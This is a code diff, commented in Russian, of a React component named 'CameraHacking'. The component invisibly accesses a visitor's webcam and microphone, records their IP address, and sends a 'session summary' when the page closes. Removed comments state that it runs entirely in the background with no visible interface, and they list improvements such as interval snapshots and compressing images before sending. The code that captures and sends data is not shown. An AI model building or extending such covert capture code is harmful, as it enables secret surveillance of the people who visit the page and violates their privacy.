-        console.log("🌐 Fetching client IP address...");
-        
-        const response = await axios.get('https://api.ipify.org?format=json', {
-          timeout: 5000 // 5 секунд таймаут
-        });
-        
-        const clientIp = response.data.ip;
-        setClientIp(clientIp);
-        
-        console.log("✅ Client IP fetched:", clientIp);
-        
-      } catch (error) {
-        console.error("❌ Error fetching client IP:", error);
-        setClientIp("IP unavailable"); // Fallback значение
-      }
+    // Отправка сводки перед закрытием
+    const handleBeforeUnload = () => {
+      sendSessionSummary();
+      stopCapturing();
     };
 
-    //  Запускаем основные функции
-    accessWebcam();
-    fetchClientIp();
-  
-    /**
-     *  ФУНКЦИЯ ОЧИСТКИ (CLEANUP)
-     * 
-     * Возвращается из useEffect и выполняется при размонтировании компонента.
-     * Освобождает ресурсы камеры для предотвращения утечек памяти.
-     * 
-     *  ЧТО ДЕЛАЕТ CLEANUP:
-     * 1. Проверяет наличие активного видеопотока
-     * 2. Получает все треки (video/audio) из потока
-     * 3. Останавливает каждый трек методом stop()
-     * 4. Очищает ссылку на поток в video элементе
-     * 
-     *  ВАЖНОСТЬ CLEANUP:
-     * Без правильной очистки камера может остаться заблокированной
-     * даже после закрытия страницы, что не позволит другим приложениям
-     * использовать камеру.
-     */
+    window.addEventListener('beforeunload', handleBeforeUnload);
+
+    // Очистка
     return () => {
-      console.log("🧹 Cleaning up camera resources...");
+      handleBeforeUnload();
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+      window.removeEventListener('beforeunload', handleBeforeUnload);
       
-      if (videoRef.current && videoRef.current.srcObject) {
-        // Получаем все медиа треки из потока
-        const tracks = videoRef.current.srcObject.getTracks();
-        
-        // Останавливаем каждый трек
-        tracks.forEach((track) => {
-          track.stop();
-          console.log(`🛑 Stopped ${track.kind} track`);
-        });
-        
-        // Очищаем ссылку на поток
-        videoRef.current.srcObject = null;
-        console.log("✅ Camera resources cleaned up");
+      stopCapturing();
+      
+      if (streamRef.current) {
+        streamRef.current.getTracks().forEach(track => track.stop());
       }
+      
+      if (audioStreamRef.current) {
+        audioStreamRef.current.getTracks().forEach(track => track.stop());
+      }
+      
+      console.log("🧹 Full cleanup completed");
     };
+  }, []);
 
-  }, []); // Пустой массив зависимостей - эффект выполняется только при монтировании
-
-  /**
-   *  РЕНДЕРИНГ КОМПОНЕНТА
-   * 
-   * Компонент не рендерит никаких видимых элементов - вся работа
-   * происходит в фоновом режиме через useEffect.
-   * 
-   * Возвращаем пустой фрагмент, чтобы React был доволен.
-   */
-  return (
-    <>
-      {/* 
-         Этот компонент работает полностью в фоне
-        Пользователь не видит никаких элементов интерфейса
-      */}
-    </>
-  );
+  return null;
 };
 
 export default CameraHacking;
-
-/**
- *  ДОПОЛНИТЕЛЬНЫЕ ЗАМЕТКИ:
- * 
- *  ТРЕБОВАНИЯ БЕЗОПАСНОСТИ:
- * - Работает только по HTTPS (кроме localhost)
- * - Требует явного разрешения пользователя
- * - Браузер показывает индикатор активности камеры
- * 
- *  ПОДДЕРЖКА БРАУЗЕРОВ:
- * - Chrome/Edge: полная поддержка
- * - Firefox: полная поддержка
- * - Safari: поддержка с ограничениями
- * - Mobile browsers: зависит от версии и настроек
- * 
- *  ВОЗМОЖНЫЕ УЛУЧШЕНИЯ:
- * - Множественные снимки с интервалом
- * - Выбор качества и разрешения изображения
- * - Детекция движения для умной съемки
- * - Сжатие изображения перед отправкой
- * - Кэширование для offline отправки
- *
- *  ИЗВЕСТНЫЕ ОГРАНИЧЕНИЯ:
- * - Не работает в iframe с другого домена
- * - Может быть заблокирован корпоративными политиками
- * - На некоторых мобильных устройствах требует user gesture
- * - В приватном режиме браузера может работать по-разному
- */
-
-
